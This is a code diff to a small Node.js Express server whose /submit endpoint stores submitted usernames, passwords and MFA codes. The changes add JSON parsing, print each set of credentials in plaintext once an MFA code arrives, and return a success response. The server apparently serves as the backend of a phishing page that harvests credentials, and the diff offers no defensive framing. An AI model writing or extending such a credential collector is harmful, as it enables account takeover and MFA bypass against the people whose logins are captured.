@@ -1,7 +1,9 @@
 const express = require("express")
 const app = express();
+const bodyParser = require("body-parser")
 
 app.use(express.static("public"));
+app.use(bodyParser.json());
 
 const hostname = '127.0.0.1';
 const port = 3010;
@@ -36,9 +38,12 @@ app.post("/submit", (req, res) => {
     accounts[foundIndex].password = password;
     accounts[foundIndex].mfa = mfa;
     // check if all fields set and print out if true
-    if (password !== "") {
+    if (mfa !== "") {
       console.log("---------------------")
-      console.log("Username: ${username}\nPassword: ${password}\nMFA: ${mfa}")
+      var printout = "Username: ".concat(username)
+      printout = printout.concat("\nPassword: ").concat(password)
+      printout = printout.concat("\nMFA: ").concat(mfa)
+      console.log(printout)
       console.log("---------------------\n")
     }
   }
@@ -51,6 +56,10 @@ app.post("/submit", (req, res) => {
     }
     accounts.push(newAccount)
   }
+  const response = {
+    status: 200
+  }
+  res.json(response)
 });
 
 
